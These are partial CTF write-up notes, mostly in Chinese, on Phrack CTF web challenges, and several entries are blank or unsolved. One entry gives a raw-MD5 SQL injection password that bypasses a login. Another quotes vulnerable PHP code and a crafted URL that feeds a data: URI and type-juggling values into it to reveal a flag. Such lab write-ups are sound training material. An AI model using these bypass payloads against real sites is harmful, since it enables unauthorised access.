# Phrack CTF WEB

1. PORT51
    > Please use port 51 to visit this site.

    - 至今没有思路

2. LOCALHOST

3. Login
    - [SQL injection with raw MD5 hashes](http://cvk.posthaven.com/sql-injection-with-raw-md5-hashes)
    - password 129581926211651571912466741651878684928  or 1839431
    - `PCTF{R4w_md5_is_d4ng3rous}`

4. 神盾局的秘密

5. IN A Mess

    > 连出题人自己都忘了flag放哪了，只记得好像很混乱的样子。

    - 页面内容`work harder!harder!harder!`
    - 查看源代码，发现只有一行：`<!--index.phps-->work harder!harder!harder!`。 **仔细** 观察，发现`index.phps`是什么鬼东西，遂打开看看。
    - 得到代码如下：
        ```
        if(!$_GET['id'])
        {
            header('Location: index.php?id=1');
            exit();
        }
        $id=$_GET['id'];
        $a=$_GET['a'];
        $b=$_GET['b'];
        if(stripos($a,'.'))
        {
            echo 'Hahahahahaha';
            return ;
        }
        $data = @file_get_contents($a,'r');
        if ($data=="1112 is a nice lab!" and
            $id==0 and
            strlen($b)>5 and
            eregi("111".substr($b,0,1),"1114") and
            substr($b,0,1)!=4)
        {
            require("flag.txt");
        }
        else
        {
            print "work harder!harder!harder!";
        }
        ```
    - 通过代码可以得知，如果我们想要得到`flag.txt`则需要以下满足~~四~~五个条件：
        1. `$data=="1112 is a nice lab!"`，其中`$data = @file_get_contents($a,'r')`
        2. `$id==0`
        3. `strlen($b)>5`
        4. `eregi("111".substr($b,0,1),"1114")`
        5. `substr($b,0,1)!=4`
    - 所以构造出可以获得flag的连接：`index.php?id=0 & a=data:text/plain,1112%20is%20a%20nice%20lab! & b=......`
    - `index.php?id=0a&a=data:text/plain,1112%20is%20a%20nice%20lab!&b=.whaterever`

6. RE?
